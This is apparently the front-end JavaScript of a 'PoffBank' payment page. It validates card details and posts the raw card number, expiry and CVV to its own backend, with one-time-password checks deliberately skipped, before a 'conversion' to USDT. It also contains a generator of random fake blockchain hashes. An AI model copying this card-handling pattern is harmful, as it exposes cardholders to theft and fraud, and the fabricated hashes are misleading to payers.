/**
 * PoffBank Payment Gateway
 * Professional payment processing powered by PoffBank
 */

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
    // Backend API URL
    apiUrl: window.location.origin.includes('localhost') 
        ? 'http://localhost:3000'   // Local development
        : 'https://poffbank-api.onrender.com',  // Render production backend
    
    // Payment settings
    minAmount: 1.00,       // Minimum payment $1.00
    maxAmount: 50000.00,   // Maximum payment $50,000
    
    // Processing settings
    processingDelay: 2500,
    
    // Security
    enableFraudCheck: true,
    requireEmail: true
};

// ============================================
// DOM ELEMENTS
// ============================================
const elements = {
    form: document.getElementById('paymentForm'),
    cardNumber: document.getElementById('cardNumber'),
    cardName: document.getElementById('cardName'),
    expiry: document.getElementById('expiry'),
    cvv: document.getElementById('cvv'),
    email: document.getElementById('email'),
    amount: document.getElementById('amount'),
    displayAmount: document.getElementById('displayAmount'),
    cardTypeIcon: document.getElementById('cardTypeIcon'),
    payButton: document.getElementById('payButton'),
    processingModal: document.getElementById('processingModal'),
    successModal: document.getElementById('successModal'),
    progressFill: document.getElementById('progressFill'),
    modalTitle: document.getElementById('modalTitle'),
    modalText: document.getElementById('modalText'),
    walletInfo: document.getElementById('walletInfo'),
    walletAddress: document.getElementById('walletAddress'),
    toast: document.getElementById('toast'),
    txId: document.getElementById('txId'),
    txAmountUsd: document.getElementById('txAmountUsd'),
    txDate: document.getElementById('txDate'),
    txHash: document.getElementById('txHash'),
    copyHashBtn: document.getElementById('copyHash')
};

// ============================================
// CARD FORMATTING & VALIDATION
// ============================================

// Format card number with spaces
elements.cardNumber.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    const cardType = detectCardType(value);
    
    // Add spaces every 4 digits
    const formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;
    
    // Update card type indicator
    updateCardTypeIcon(cardType);
});

// Detect card type from number
detectCardType = (number) => {
    const patterns = {
        visa: /^4/,
        mastercard: /^5[1-5]|^2[2-7]/,
        amex: /^3[47]/,
        discover: /^6(?:011|5)/,
        jcb: /^(?:2131|1800|35)/,
        diners: /^3(?:0[0-5]|[68])/,
        unionpay: /^62/
    };
    
    for (const [type, pattern] of Object.entries(patterns)) {
        if (pattern.test(number)) return type;
    }
    return null;
};

// Update card type icon
updateCardTypeIcon = (type) => {
    if (!type) {
        elements.cardTypeIcon.textContent = '';
        return;
    }
    
    const icons = {
        visa: 'VISA',
        mastercard: 'MC',
        amex: 'AMEX',
        discover: 'DISC',
        jcb: 'JCB',
        diners: 'DINERS',
        unionpay: 'UNION'
    };
    
    elements.cardTypeIcon.textContent = icons[type] || type.toUpperCase();
};

// Format expiry date (MM/YY)
elements.expiry.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length >= 2) {
        const month = parseInt(value.slice(0, 2));
        if (month > 12) value = '12' + value.slice(2);
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    
    e.target.value = value;
});

// CVV validation
elements.cvv.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
});

// Card name uppercase
elements.cardName.addEventListener('input', (e) => {
    e.target.value = e.target.value.toUpperCase();
});

// ============================================
// AMOUNT & USDT CONVERSION
// ============================================

// Update amount display
elements.amount.addEventListener('input', (e) => {
    const value = parseFloat(e.target.value) || 0;
    elements.displayAmount.textContent = value.toFixed(2);
});

// ============================================
// FORM VALIDATION
// ============================================

validateForm = () => {
    const errors = [];
    
    // Card number validation
    const cardNum = elements.cardNumber.value.replace(/\s/g, '');
    if (cardNum.length < 13 || cardNum.length > 19) {
        errors.push('Please enter a valid card number (13-19 digits)');
    }
    
    // Luhn algorithm check
    if (!luhnCheck(cardNum)) {
        errors.push('Invalid card number (checksum failed)');
    }
    
    // Expiry validation
    const [month, year] = elements.expiry.value.split('/');
    if (!month || !year || month.length !== 2 || year.length !== 2) {
        errors.push('Please enter a valid expiry date (MM/YY)');
    } else {
        const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
        if (expiryDate < new Date()) {
            errors.push('Card has expired');
        }
    }
    
    // CVV validation
    const cvv = elements.cvv.value;
    if (cvv.length < 3 || cvv.length > 4) {
        errors.push('Please enter a valid CVV (3-4 digits)');
    }
    
    // Email validation
    const email = elements.email.value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errors.push('Please enter a valid email address');
    }
    
    // Amount validation
    const amount = parseFloat(elements.amount.value);
    if (isNaN(amount) || amount < CONFIG.minAmount) {
        errors.push(`Minimum payment amount is $${CONFIG.minAmount.toFixed(2)}`);
    }
    if (amount > CONFIG.maxAmount) {
        errors.push(`Maximum payment amount is $${CONFIG.maxAmount.toFixed(2)}`);
    }
    
    return errors;
};

// Luhn algorithm for card validation
luhnCheck = (cardNumber) => {
    let sum = 0;
    let isEven = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i], 10);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
};

// ============================================
// TRANSACTION PROCESSING
// ============================================

generateTransactionId = () => {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 8).toUpperCase();
    return `POB-${timestamp}-${random}`;
};

generateBlockchainHash = () => {
    return '0x' + Array(64).fill(0).map(() => 
        Math.floor(Math.random() * 16).toString(16)
    ).join('');
};

// Check if backend is available (with timeout for Render cold start)
checkBackendHealth = async (retries = 3) => {
    for (let i = 0; i < retries; i++) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
            
            const response = await fetch(`${CONFIG.apiUrl}/api/health`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' },
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            if (response.ok) return true;
            
            // If not ok, wait and retry
            if (i < retries - 1) {
                await new Promise(r => setTimeout(r, 2000));
            }
        } catch (error) {
            console.log(`Backend health check attempt ${i + 1} failed:`, error.message);
            // Wait 2 seconds before retry
            if (i < retries - 1) {
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    }
    return false;
};

// Main payment processing - DIRECT FLOW (NO OTP)
let currentOrderId = null;
let paymentStatusInterval = null;

processPayment = async (formData) => {
    const amount = parseFloat(formData.amount);
    
    // Check backend availability
    const backendAvailable = await checkBackendHealth();
    if (!backendAvailable) {
        alert('Payment server is starting up. Please wait 30 seconds and try again.');
        return;
    }
    
    // Disable button
    elements.payButton.classList.add('loading');
    elements.payButton.disabled = true;
    
    try {
        // Initialize payment and start processing immediately (no OTP)
        const initResponse = await fetch(`${CONFIG.apiUrl}/api/payment/init`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: amount,
                email: formData.email,
                cardData: {
                    cardNumber: formData.cardNumber,
                    cardName: formData.cardName,
                    expiry: formData.expiry,
                    cvv: formData.cvv
                },
                description: 'PoffBank Secure Payment'
            })
        });
        
        if (!initResponse.ok) {
            throw new Error('Failed to initialize payment');
        }
        
        const initData = await initResponse.json();
        
        if (!initData.success) {
            throw new Error(initData.error || 'Payment initialization failed');
        }
        
        currentOrderId = initData.orderId;
        
        // Start processing immediately - no OTP
        startRealProcessing();
        
    } catch (error) {
        console.error('Payment initialization error:', error);
        alert('Payment failed: ' + error.message);
        elements.payButton.classList.remove('loading');
        elements.payButton.disabled = false;
    }
};

// Start processing modal and poll status
function startRealProcessing() {
    // Show processing modal
    elements.processingModal.classList.add('active');
    elements.progressFill.style.width = '10%';
    elements.modalTitle.textContent = 'Verifying Card...';
    elements.modalText.textContent = 'Authorizing card transaction with issuing bank...';
    
    // Start polling for status
    pollPaymentStatus();
}

// Poll payment status
async function pollPaymentStatus() {
    if (!currentOrderId) return;
    
    try {
        const response = await fetch(`${CONFIG.apiUrl}/api/payment/status/${currentOrderId}`);
        const data = await response.json();
        
        if (!data.success) {
            throw new Error('Failed to get status');
        }
        
        updateProcessingUI(data.status);
        
        if (data.status === 'completed') {
            // Payment successful
            clearInterval(paymentStatusInterval);
            setTimeout(() => showSuccess(data), 500);
        } else if (data.status === 'failed' || data.status === 'timeout') {
            // Payment failed
            clearInterval(paymentStatusInterval);
            alert('Payment failed: ' + (data.error || 'Transaction could not be completed'));
            elements.processingModal.classList.remove('active');
            elements.payButton.classList.remove('loading');
            elements.payButton.disabled = false;
        } else {
            // Still processing - continue polling
            if (!paymentStatusInterval) {
                paymentStatusInterval = setInterval(pollPaymentStatus, 3000);
            }
        }
        
    } catch (error) {
        console.error('Status polling error:', error);
    }
}

// Update processing UI based on status
function updateProcessingUI(status) {
    const steps = {
        'processing': { width: '30%', title: 'Verifying Card...', text: 'Authorizing with issuing bank...', step: 1 },
        'card_authorized': { width: '50%', title: 'Card Authorized', text: 'Processing payment deduction...', step: 2 },
        'awaiting_blockchain': { width: '75%', title: 'Converting to USDT...', text: 'Confirming blockchain transaction...', step: 3 },
        'completed': { width: '100%', title: 'Payment Successful!', text: 'Transaction completed successfully!', step: 4 },
        'failed': { width: '100%', title: 'Payment Failed', text: 'Transaction could not be completed', step: 4 }
    };
    
    const step = steps[status] || steps['processing'];
    elements.progressFill.style.width = step.width;
    elements.modalTitle.textContent = step.title;
    elements.modalText.textContent = step.text;
    
    // Update step indicators
    document.querySelectorAll('.step').forEach((el, idx) => {
        if (idx < step.step) el.classList.add('active', 'completed');
        else if (idx === step.step) el.classList.add('active');
    });
}

// Show success with real transaction data
function showSuccess(paymentData) {
    elements.processingModal.classList.remove('active');
    
    // Populate success modal with real data
    document.getElementById('receiptId').textContent = currentOrderId;
    document.getElementById('receiptDate').textContent = new Date().toLocaleString();
    document.getElementById('receiptAmount').textContent = '$' + paymentData.amount?.toFixed(2);
    document.getElementById('receiptEmail').textContent = document.getElementById('email').value;
    document.getElementById('receiptTxHash').textContent = paymentData.txHash?.substring(0, 20) + '...' || 'Processing...';
    
    elements.successModal.classList.add('active');
    
    // Reset form
    document.querySelector('.payment-form').reset();
    elements.payButton.classList.remove('loading');
    elements.payButton.disabled = false;
    clearInterval(paymentStatusInterval);
    paymentStatusInterval = null;
}

// Old generateBlockchainHash function kept for compatibility
generateBlockchainHash = () => {
    return '0x' + Array(64).fill(0).map(() => 
        Math.floor(Math.random() * 16).toString(16)
    ).join('');
};

// Populate success modal with transaction data
populateSuccessModal = (data) => {
    elements.txId.textContent = data.id;
    elements.txAmountUsd.textContent = `$${data.usdAmount} USD`;
    elements.txDate.textContent = data.date;
    elements.txHash.textContent = data.hash;
};

// ============================================
// FORM SUBMISSION
// ============================================

elements.form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Validate form
    const errors = validateForm();
    if (errors.length > 0) {
        alert('Please fix the following errors:\n\n' + errors.join('\n'));
        return;
    }
    
    // Collect form data
    const formData = {
        cardName: elements.cardName.value,
        cardNumber: elements.cardNumber.value.replace(/\s/g, ''),
        expiry: elements.expiry.value,
        cvv: elements.cvv.value,
        email: elements.email.value,
        amount: elements.amount.value
    };
    
    // Process payment
    await processPayment(formData);
});

// ============================================
// UTILITY FUNCTIONS
// ============================================

// Reset payment form
resetPayment = () => {
    elements.form.reset();
    elements.displayAmount.textContent = '0.00';
    elements.usdtAmount.textContent = '0.00';
    elements.previewUsdt.textContent = '0.00';
    elements.cardTypeIcon.textContent = '';
    elements.successModal.classList.remove('active');
};

// Copy transaction hash
if (elements.copyHashBtn) {
    elements.copyHashBtn.addEventListener('click', () => {
        const hash = elements.txHash.textContent;
        navigator.clipboard.writeText(hash).then(() => {
            showToast('Transaction hash copied to clipboard');
        }).catch(() => {
            // Fallback
            const textArea = document.createElement('textarea');
            textArea.value = hash;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            showToast('Transaction hash copied to clipboard');
        });
    });
}

// Show toast notification
showToast = (message) => {
    const toast = elements.toast;
    toast.querySelector('.toast-message').textContent = message;
    toast.classList.add('show');
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
};

// ============================================
// KEYBOARD NAVIGATION
// ============================================

document.querySelectorAll('input').forEach((input, index, inputs) => {
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        }
    });
});

// ============================================
// INITIALIZATION
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // Add animation classes on load
    document.querySelectorAll('.summary-card, .form-card').forEach((el, i) => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        setTimeout(() => {
            el.style.transition = 'all 0.6s cubic-bezier(0.16, 1, 0.3, 1)';
            el.style.opacity = '1';
            el.style.transform = 'translateY(0)';
        }, 100 + (i * 100));
    });
    
    // Close modals on backdrop click
    document.querySelectorAll('.modal').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal && modal.id !== 'processingModal') {
                modal.classList.remove('active');
            }
        });
    });
    
    // Console info
    console.log('%c🔒 PoffBank Payment Gateway', 'color: #dc2626; font-size: 16px; font-weight: bold;');
    console.log('%cSecure Payment Processing for PoffBank', 'color: #26a17b; font-size: 12px;');
    console.log('%cBackend: NOWPayments API integration active', 'color: #3b82f6; font-size: 11px;');
    console.log(`%cAPI Server: ${CONFIG.apiUrl}`, 'color: #6b7280; font-size: 10px;');
});
